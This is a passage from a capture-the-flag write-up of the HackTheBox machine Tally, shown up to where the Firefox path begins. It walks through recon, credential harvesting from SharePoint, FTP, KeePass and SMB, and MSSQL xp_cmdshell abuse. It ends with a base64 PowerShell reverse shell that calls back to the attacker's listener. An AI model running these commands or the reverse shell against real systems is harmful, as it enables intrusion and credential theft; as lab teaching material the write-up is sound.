---
title: HTB: Tally
url: https://0xdf.gitlab.io/2022/04/11/htb-tally.html
date: 2022-04-11T09:00:00+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, ctf, htb-tally, nmap, windows, sharepoint, mssql, keepass, hashcat, kpcli, crackmapexec, smbclient, mssqlclient, xp-cmdshell, firefox, user-agent, searchsploit, cve-2016-1960, shellcode, python, scheduled-task, rottenpotato, sweetpotato, cve-2017-0213, visual-studio, windows-sessions, msfvenom, metasploit, migrate, oscp-plus-v1
---

![Tally](https://0xdfimages.gitlab.io/img/tally-cover.png)

Tally is a difficult Windows Machine from Egre55, who likes to make boxes with multiple paths for each step. The box starts with a lot of enumeration, starting with a SharePoint instance that leaks creds for FTP. With FTP access, there are two paths to root. First there’s a KeePass db with creds for SMB, which has a binary with creds for MSSQL, and I can use MSSQL access to run commands and get a shell. Alternatively, I can spot a Firefox installer and a note saying that certain HTML pages on the FTP server will be visited regularly, and craft a malicious page to exploit that browser. To escalate, there’s a scheduled task running a writable PowerShell script as administrator. There’s also SeImpersonate privilege in a shell gained via MSSQL, which can be leveraged to get root as well. Finally, I’ll show a local Windows exploit that was common at the time of the box release, CVE-2017-0213.

## Box Info

| Name | [Tally](https://hackthebox.com/machines/tally)  [Tally](https://hackthebox.com/machines/tally) [Play on HackTheBox](https://hackthebox.com/machines/tally) |
| --- | --- |
| Release Date | [04 Nov 2017](https://twitter.com/hackthebox_eu/status/926159192754450432) |
| Retire Date | 05 May 2018 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Tally |
| Radar Graph | Radar chart for Tally |
| First Blood User | 21:09:43[tress tress](https://app.hackthebox.com/users/6752) |
| First Blood Root | 1 day15:36:40[decoder decoder](https://app.hackthebox.com/users/1391) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` finds 21 open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.59
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-09 10:54 UTC
Warning: 10.10.10.59 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.59
Host is up (0.090s latency).
Not shown: 65469 closed ports, 45 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
81/tcp    open  hosts2-ns
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
15567/tcp open  unknown
32843/tcp open  unknown
32844/tcp open  unknown
32846/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
oxdf@hacky$ nmap -p 21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664-49670 -sCV -oA scans/nmap-tcpscripts 10.10.10.59
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-09 11:02 UTC
Nmap scan report for 10.10.10.59
Host is up (0.090s latency).

PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-04-09T10:46:05
|_Not valid after:  2052-04-09T10:46:05
|_ssl-date: 2022-04-09T11:03:41+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
15567/tcp open  http               Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_ssl-date: 2022-04-09T11:03:41+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-09T11:03:31
|_  start_date: 2022-04-09T10:45:44

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.92 seconds

```

The box is clearly a Windows host, and based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows 10 or Server 2016 (it’s not going to be 2019 since this box was released in 2017).

When I Google “Windows TCP 32843”, the first link is [this post about TCP ports used by SharePoint](https://blogit.create.pt/fabiocarvalho/2017/02/14/sharepoint-2016-tcpip-ports/). It included 808, 32843, 32844, and 32864 as services in use for SharePoint, and this is a pretty good indication of what may be to come.

With this many ports, I’ll make a list of what I want to investigate. First, I need to dig right into:
- HTTP using IIS on 80, which `nmap` identified as SharePoint.

There’s a bunch of services that I’ll need creds to connect to (I’ll do a quick check for each to confirm that):
- FTP on 21 - `nmap` didn’t call out anonymous login, and I confirmed it. Will check back with creds.
- HTTP using IIS on 15567 - Visiting just prompts for HTTP basic auth, and I don’t have creds.
- SMB/RPC/NetBios on 135/139/445 - Trying to connect with `smbclient -N -L //10.10.10.59` returns `NT_STATUS_ACCESS_DENIED`. Will have to check back if I find creds.
- MSSQL on 1433 - Need creds to authenticate to the DB.
- WinRM on 5985 - Not much I can do without creds, but with creds, worth a try to get a shell.

Then there’s other ports I basically ignore for now:
- 81 - Some kind of service HTTP, but querying it just returns Bad- Request.
- 808, 32843, 32844, 32846 - All support SharePoint based on the link above.
- 47001 - Support for WinRM
- 49664-49670 - RPC ports

### Website - TCP 80

#### Site

Visiting `http://10.10.10.59` redirects to a SharePoint home page:

![image-20220409121206314](https://0xdfimages.gitlab.io/img/image-20220409121206314.png)

SharePoint likes being accessed by hostname, and `nmap` did find the hostname `tally`. I’ll add that to my `/etc/hosts` file:

```
10.10.10.59 tally

```

Loading `http://tally` seems to load the same page.

There’s not much I can do here. Some Googling for “pentesting Sharepoint” finds [this article](https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/) from BishopFox. Looking at my notes from originally solving in 2018, I actually used the Perl script in that article to brute force paths. This time, I just used the paths it listed in the article to manually find some things. Some (like `aclinv.aspx` require auth), but `_layouts/viewlsts.aspx` does return something:

![image-20220409123120157](https://0xdfimages.gitlab.io/img/image-20220409123120157.png)

The “Documents” section seems to have one item, and clicking shows it’s interesting:

![image-20220409123455622](https://0xdfimages.gitlab.io/img/image-20220409123455622.png)

Clicking on `ftp-details` downloads a `.docx` file, which has creds:

![image-20220409123537232](https://0xdfimages.gitlab.io/img/image-20220409123537232.png)

It doesn’t give me any usernames, just passwords.

The “Site Pages” link indicates on item as well. Visiting this with a base of the IP will actually just redirect to the home page. But using `tally`, it will show the pages:

![image-20220409125955913](https://0xdfimages.gitlab.io/img/image-20220409125955913.png)

When I originally solved this, I found this page by looking at the mobile version of the site (using a mobile User Agent string). Either way, looking at the page, it gives some usernames:

![image-20220409130212971](https://0xdfimages.gitlab.io/img/image-20220409130212971.png)

There’s sarah, tim, and rahul, but also ftp\_user.

#### Tech Stack

The HTTP headers show `X-Powered-By: ASP.NET`, which matches the `.aspx` extension I’ve noticed on the pages. Other than that, not much I can gleem.

#### Directory Brute Force

I’ll start to `feroxbuster` against the site with `-x aspx` since I’ve already seen that, but it’s very slow, and throws a lot of errors. I can come back and try more if I get stuck, but I’ll abandon that for now.

### FTP - TCP 21

#### Download

The password from the file doesn’t work with tim, sarah, or rahul, but it does work for ftp\_user:

```

oxdf@hacky$ ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:oxdf): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 

```

There are five directories at the system root:

```

ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  11:51PM       <DIR>          From-Custodian
10-01-17  11:37PM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.

```

Given the large number of small looking files, I’ll just download everything using `wget`:

```

oxdf@hacky$ wget -r 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
...[snip]...
Total wall clock time: 2m 50s
Downloaded: 125 files, 98M in 1m 43s (972 KB/s)

```

This will create a directory named `10.10.10.59` and populate it with the contents of the FTP server.

#### Enumeration

`From-Custodian` has a bunch of `.log` files and `Logs` has a bunch of `.txt` files that don’t seem very interesting.

`Intranet/Binaries` has an installer for Firefox, `Firefox Setup 44.0.2.exe`. That’s worth noting for a version number of Firefox that’s likely installed on Tally.

`To-Upload` has an `employees.xlsx` that contains 179 users, with first, last, and id. There’s also an `Invoiced.zip`, but it doesn’t have anything interesting.

`User` has a bunch of users:

```

oxdf@hacky$ ls
Administrator  Ekta  Jess  Paul  Rahul  Sarah  Stuart  Tim  Yenwi

```

I’ll use `find` with `-type f` to get a list of all the files in `User`:

```

oxdf@hacky$ find . -type f
./Tim/Project/Log/do to.txt
./Tim/Files/KeePass-2.36/KeePass.exe
./Tim/Files/KeePass-2.36/KeePass.chm
./Tim/Files/KeePass-2.36/KeePassLibC64.dll
./Tim/Files/KeePass-2.36/ShInstUtil.exe
./Tim/Files/KeePass-2.36/License.txt
./Tim/Files/KeePass-2.36/KeePass.XmlSerializers.dll
./Tim/Files/KeePass-2.36/KeePassLibC32.dll
./Tim/Files/KeePass-2.36/KeePass.exe.config
./Tim/Files/bonus.txt
./Tim/Files/tim.kdbx
./Jess/actu8-espreadsheet-designer-datasheet.pdf
./Sarah/notes.txt
./Sarah/Windows-KB890830-x64-V5.52.exe
./Sarah/MBSASetup-x64-EN.msi
./Paul/Monetary_penalties_for_breaches_of_financial_sanctions.pdf
./Paul/financial_sanctions_guidance_august_2017.pdf
./Paul/financial-list-guide.pdf
./Stuart/customers - Copy.csv
./Stuart/Unit4-Connect-Financials-Agenda.pdf
./Ekta/PSAIS_1_April_2017.pdf
./Ekta/OFSI_quick_guide_flyer.pdf

```

Two things jump out as the most interesting things:
- Tim has a KeePass database, `tim.kdbx`.
- Sarah has a `notes.txt`.

The `notes.txt` references removing Orchard CMS, and the need to uninstall SQL Server 2016.

### KeePass DB

#### Crack Master Password

To get into a KeePass database, I’ll need the master password. I’ll use the `john` script `keepass2john` to get a hash of that password that I can attempt to break with `hashcat` (or `john`, I just prefer `hashcat`):

```

oxdf@hacky$ keepass2john 10.10.10.59/User/Tim/Files/tim.kdbx 
tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
oxdf@hacky$ keepass2john 10.10.10.59/User/Tim/Files/tim.kdbx > tim.kdbx.hash

```

I’ll start `hashcat` running against the hash with `rockyou.txt` as the wordlist. The new version of `hashcat` doesn’t require me to identify the hash format, but rather finds it for me:

```

$ /opt/hashcat-6.2.5/hashcat.bin tim.kdbx.hash --user /usr/share/wordlists/rockyou.txt 
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
...[snip]...
$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo
...[snip]...

```

It finds the password in less than 10 seconds, “simplementeyo”.

#### Extract Creds

I’ll use `kpcli` to read the database. On connecting, it asks for the password:

```

oxdf@hacky$ kpcli --kdb tim.kdbx                                                                         
Please provide the master password: *************************
                                                                    
KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.
                                                                    
kpcli:/>

```

A quick way to list all the password in the database is the `find` command:

```

kpcli:/> find .
Searching for "." ...
 - 3 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===             
0. Default                                                                 
1. PDF Writer                                                              
2. TALLY ACCT share

```

Now `show -f [number]` will give details on that number (without the `-f` the password will be hidden):

```

kpcli:/> show -f 0

 Path: /WORK/CISCO/
Title: Default
Uname: cisco
 Pass: cisco123
  URL: 
Notes: 

kpcli:/> show -f 1

 Path: /WORK/SOFTWARE/
Title: PDF Writer
Uname: 64257-56525-54257-54734
 Pass: 
  URL: 
Notes: 

kpcli:/> show -f 2

 Path: /WORK/WINDOWS/Shares/
Title: TALLY ACCT share
Uname: Finance
 Pass: Acc0unting
  URL: 
Notes: 

```

The two sets of creds I’ll take away are “cisco”/”cisco123” and “Finance”/”Acc0unting”. The latter says it’s for a share on Tally. I won’t find anywhere where the cisco password is useful.

### SMB - TCP 445

#### Validate Creds

`crackmapexec` shows those creds work for SMB on Tally:

```

oxdf@hacky$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\Finance:Acc0unting 

```

Adding the `--shares` options shows there is an `ACCT` share, and that these creds can read from it:

```

oxdf@hacky$ crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting --shares
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\Finance:Acc0unting 
SMB         10.10.10.59     445    TALLY            [+] Enumerated shares
SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark
SMB         10.10.10.59     445    TALLY            -----           -----------     ------
SMB         10.10.10.59     445    TALLY            ACCT            READ            
SMB         10.10.10.59     445    TALLY            ADMIN$                          Remote Admin
SMB         10.10.10.59     445    TALLY            C$                              Default share
SMB         10.10.10.59     445    TALLY            IPC$                            Remote IPC

```

#### Download All - Fail

I’ll connect to it and see that it has a fair number of folders:

```

oxdf@hacky$ smbclient //10.10.10.59/ACCT -U Finance Acc0unting
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 18 05:58:18 2017
  ..                                  D        0  Mon Sep 18 05:58:18 2017
  Customers                           D        0  Sun Sep 17 20:28:40 2017
  Fees                                D        0  Mon Aug 28 21:20:52 2017
  Invoices                            D        0  Mon Aug 28 21:18:19 2017
  Jess                                D        0  Sun Sep 17 20:41:29 2017
  Payroll                             D        0  Mon Aug 28 21:13:32 2017
  Reports                             D        0  Fri Sep  1 20:50:11 2017
  Tax                                 D        0  Sun Sep 17 20:45:47 2017
  Transactions                        D        0  Wed Sep 13 19:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 20:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 20:49:13 2017

                8387839 blocks of size 4096. 656891 blocks available

```

I’ll start with a similar approach as with FTP and get everything. `lcd` changes directory on my local system. Then I’ll turn off prompt and enable recursion. Finally `mget *` will get everything:

```

smb: \> lcd smbloot/
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
...[snip]...

```

However, after a few minutes, I’ll realize this is not a good approach. There’s a *ton* of junk on this share. I’m going to need to take a bit more targeted approach.

#### Mount Share

I’ll use `mount` to mount the share onto a folder on my local system:

```

oxdf@hacky$ sudo mount -t cifs -o user=Finance,pass=Acc0unting //10.10.10.59/ACCT /mnt
oxdf@hacky$ ls /mnt
Customers  Fees  Invoices  Jess  Payroll  Reports  Tax  Transactions  zz_Archived  zz_Migration

```

#### Enumerate

Now I’ll more easily look through the file share. There’s still a ton here, a lot of which are just junk files. There’s no good way to show all the things that turned out to be nothing. I will note the `zz_Archived/SQL` folder, which has a file named `conn-info`:

```

old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally

```

I’ll try these creds for MSSQL, but as it says in the note, someone must have changed them for Tally.

Eventually I’ll find `zz_Migrations/Binaries`. There’s a bunch of useless `.cap` files, which I’ll remove from this listing:

```

oxdf@hacky$ find . -type f | grep -v cap$
./CardReader/RapportSetup.exe
./FileZilla_Server-0_9_60_2.exe
./ImportGSTIN.zip
./NDP452-KB2901907-x86-x64-AllOS-ENU.exe
./New folder/crystal_reports_viewer_2016_sp04_51051980.zip
./New folder/Macabacus2016.exe
./New folder/Orchard.Web.1.7.3.zip
./New folder/putty.exe
./New folder/RpprtSetup.exe
./New folder/tableau-desktop-32bit-10-3-2.exe
./New folder/tester.exe
./New folder/vcredist_x64.exe
./Sage50_2017.2.0.exe
./Tally.ERP 9 Release 6/capsules/tally.cif
./Tally.ERP 9 Release 6/capsules/tally.dif
./Tally.ERP 9 Release 6/regodbc32.exe
./Tally.ERP 9 Release 6/Setup.exe
./Tally.ERP 9 Release 6/tally.exe
./Tally.ERP 9 Release 6/tally.ini
./Tally.ERP 9 Release 6/Tally.sav
./Tally.ERP 9 Release 6/tallygatewayserver.exe
./Tally.ERP 9 Release 6/tallywin.dat
./Tally.ERP 9 Release 6/tallywin32.dat
./Tally.ERP 9 Release 6/tdlfunc.log
./windirstat1_1_2_setup.exe

```

The thing that jumps out quickly here is `tester.exe`, because it’s the only thing in here that doesn’t look like a known piece of commercial software.

Looking at the strings in `tester.exe` (`strings -n 10 tester.exe | less`), there’s one towards the top that is very interesting:

```

oxdf@hacky$ strings -n 10 tester.exe
!This program cannot be run in DOS mode.
PP9E u:PPVWP                  
9C`u99C\t4                                     
SQLSTATE:                  
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
Unknown exception
bad locale name
iostream stream error
...[snip]...

```

There’s a connection string for SQL server:

```

DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;

```

## Paths Overview

There’s at least two ways to get a shell as sarah, and at least three ways to get from sarah to full access (Administrator or SYSTEM). I’m sure there are many more local privesc exploits that have been released since this box was retired in 2018, but I’m going to focus on what was known when this box was active.

![](https://0xdfimages.gitlab.io/img/Tally-16496736811962.png)

I’ll show two ways to get a foothold as sarah. If I use MSSQL, the sarah will also have `SeImpersonate`, which allows a way to SYSTEM. From either foothold, there’s CVE-2017-0213 and a scheduled task that can be abused. The numbers at the top right of each box will match the paths in the headers in this blog.

## Shell as sarah [MSSQL - path 1]

### Connect to MSSQL

To connect to MSSQL, I’ll use `mssqlclient.py` (part of the [Impacket](https://github.com/SecureAuthCorp/impacket) package), but it errors out:

```

oxdf@hacky$ mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] [('SSL routines', 'state_machine', 'internal error')]

```

Some Googling for the error landed me on this [GitHub issue](https://github.com/SecureAuthCorp/impacket/issues/856). [This post](https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208) says they fixed it by changing two lines in `tds.py`.

In general, it’s not great to mess with installed Python packages, but this is such a small change, I’m going to give it a go. To find where `tds.py` is located, I’ll run again with `-debug`:

```

oxdf@hacky$ mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59 -debug
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket
[*] Encryption required, switching to TLS
[+] Exception:
Traceback (most recent call last):
  File "/usr/local/bin/mssqlclient.py", line 175, in <module>
    res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
  File "/usr/local/lib/python3.8/dist-packages/impacket/tds.py", line 920, in login
    tls.do_handshake()
  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/SSL.py", line 1894, in do_handshake
    self._raise_ssl_error(self._ssl, result)
  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/SSL.py", line 1632, in _raise_ssl_error
    _raise_current_error()
  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/_util.py", line 57, in exception_from_error_queue
    raise exception_type(errors)
OpenSSL.SSL.Error: [('SSL routines', 'state_machine', 'internal error')]
[-] [('SSL routines', 'state_machine', 'internal error')]

```

The first line after the version shows the install location, `/usr/local/lib/python3.8/dist-packages/impacket`. Inside that dir, I’ll find `tds.py`. I’ll make those two changes, adding “\_2” in two places, and then run again, and it works:

```

oxdf@hacky$ mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59 
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL>

```

### xp\_cmdshell

Before I look through the DB, I’ll try to run commands. `mssqlclient.py` has commands built in to interact with the `xp_cmdshell` [stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15):

```

SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

```

I’ll give it a try, but it fails:

```

SQL> xp_cmdshell whoami
[-] ERROR(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

It says access is blocked. Since I’m running as the `sa` account, I should be able to just enabled it. It works:

```

SQL> enable_xp_cmdshell
[*] INFO(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(TALLY): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             
--------------------------------------------------------------------------------   
tally\sarah
NULL    

```

`dir` shows I’m running out of `system32`:

```

SQL> xp_cmdshell dir                                                
output
--------------------------------------------------------------------------------
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB
NULL
 Directory of C:\Windows\system32
NULL
...[snip]...

```

### Shell

I’ll visit [revshells.com](https://www.revshells.com/) and update it with my IP and port. I’ll filter by windows and select PowerShell #3 (Base64). I like the base64 one because I don’t have to worry about bad characters in the MSSQL command line.

![image-20220409154527665](https://0xdfimages.gitlab.io/img/image-20220409154527665.png)

I’ll use the `rlwrap` listener to get up and down arrows on my soon to be shell, and start that on my VM. Then I’ll copy the shell, and paste it into the MSSQL prompt:

```

SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

```

It hangs, and there’s a connection at `nc`:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.59 52464
whoami
tally\sarah
PS C:\Windows\system32> 

```

Once I run my first command, it returns the result and then prints the prompt.

On sarah’s desktop, I’ll find `user.txt`:

```

PS C:\users\sarah\desktop> type user.txt
6ff1cd63************************

```

## Shell as sarah [Firefox - path 2]

### Identify Firefox Exploit

#### Firefox Enumeration Data

There’s a couple clues from above that suggest a Firefox exploit might work. On the [Finance Team Migration update](#site) page in SharePoint, Sarah and Tim say to Rahul:

